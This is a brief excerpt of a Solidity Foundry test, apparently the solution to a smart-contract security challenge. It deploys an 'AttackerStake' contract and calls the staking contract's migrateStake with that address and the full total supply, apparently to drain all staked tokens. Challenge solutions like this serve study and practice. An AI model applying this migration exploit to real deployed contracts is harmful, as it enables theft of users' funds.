...
import {AttackerStake} from "src/exploiter_contracts/tasty-stake_exploiter.sol";
...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        AttackerStake attackerStake = new AttackerStake();
        tastyStaking.migrateStake(address(attackerStake), tastyStaking.totalSupply());
